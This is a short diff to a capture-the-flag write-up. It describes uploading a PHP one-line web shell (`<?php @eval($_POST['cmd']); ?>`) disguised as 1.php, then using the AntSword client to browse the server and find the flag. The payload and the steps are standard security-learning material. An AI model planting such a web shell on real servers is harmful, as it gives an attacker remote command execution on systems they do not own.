@@ -959,4 +959,10 @@ Then we can get the permission through a one-sentence ==Trojan horse==
 	- When comparing beginning, `1.php` will be regarded as $1$.
 - `content` should be the one-sentence Trojan Horse. `<?php @eval($_POST['cmd']); ?>`
 - Then we can use the [AntSword](https://www.yuque.com/antswordproject/antsword/srruro#) to run the hack command through `cmd`.
+## Experiment
 ![[Pasted image 20241207111000.png]]
+
+![[Pasted image 20241207111220.png]]
+We can get the Directory Structure of the Web Server!
+![[Pasted image 20241207111238.png]]
+The flag we want is over there!
